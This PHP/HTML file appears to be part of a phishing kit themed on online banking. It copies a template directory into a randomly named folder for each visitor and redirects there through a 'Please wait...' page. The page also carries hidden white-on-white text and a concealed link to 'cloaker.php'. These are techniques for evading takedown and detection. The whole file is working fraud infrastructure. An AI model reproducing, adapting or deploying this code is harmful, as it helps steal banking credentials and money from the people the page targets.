<?php



setcookie("real", "OK");

$random = rand(0, 10000000);
$md5    = md5("$random");
$base   = base64_encode($md5);
$dst    = 'a1b2c3/'.md5("$base");

function dublicate($src, $dst)
{
    $dir = opendir($src);
    @mkdir($dst);
    while (false !== ($file = readdir($dir))) {
        if (($file != '.') && ($file != '..')) {
            if (is_dir($src . '/' . $file)) {
                dublicate($src . '/' . $file, $dst . '/' . $file);
            } else {
                copy($src . '/' . $file, $dst . '/' . $file);
            }
        }
    }
    closedir($dir);
}

$src = "def2";
dublicate($src, $dst);


?>


<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="refresh" content="1;url=<?php echo $dst."?".$_SERVER["QUERY_STRING"]; ?>" />.
  <title>Please wait...</title>
</head>

<body>

  <div class="con">
    <div class="col">
      <div class="tbel">
        <div class="lor">
          <p style="color: white">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Rerum asperiores optio
            perspiciatis labore minima, placeat dolore explicabo beatae earum neque perferendis necessitatibus, ex est
            inventore rem veniam numquam debitis soluta!</p>
        </div>
      </div>
    </div>
  </div>

  <a href="cloaker.php" style="color: white">Banking Online</a>



</body>

</html>